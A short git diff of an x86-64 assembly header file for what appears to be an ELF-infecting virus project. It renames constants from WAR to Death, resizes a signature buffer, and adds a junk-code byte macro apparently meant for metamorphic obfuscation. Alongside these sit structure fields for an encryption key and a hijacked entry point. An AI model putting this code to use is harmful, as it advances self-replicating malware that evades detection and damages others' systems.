@@ -71,8 +71,8 @@
 %define SYS_dup2	33
 %define SYS_execve	59
 
-%define WAR_SIZE end_addr - _start
-%define WAR_SIZE_NO_BSS buffer_bss - _start
+%define Death_SIZE end_addr - _start
+%define Death_SIZE_NO_BSS buffer_bss - _start
 
 ; STRUCTURES
 ; https://gist.github.com/x0nu11byt3/bcb35c3de461e5fb66173071a2379779
@@ -86,7 +86,7 @@ struc mydata
     .file_size           resq 1
     .file                resb 13  ; 'elf64 found!' + '\0'
 
-    .signature           resb 86  ; longueur à adapter à ta chaîne
+    .signature           resb 88  ; longueur à adapter à ta chaîne
     .encryption_key      resq 1
 
     .old_entry           resq 1
@@ -133,6 +133,8 @@ struc mydata
     .templates_r11       resb 28
     .templates_r13       resb 28
     .templates_r15       resb 28
+    .templates_sys       resb 117
+
 
     .dynm                resb 1
     .inte                resb 1
@@ -210,6 +212,14 @@ struc phdr
 endstruc
 
 ; MACROS
+
+%macro JUNK_5 0
+    db 0x50, 0x6A, 0x18, 0x58, 0x0F, 0x05, 0x90, 0x90, 0x58
+%endmacro
+
+
+
+
 %macro PUSH_ALL 0
     pushfq
     push	rax
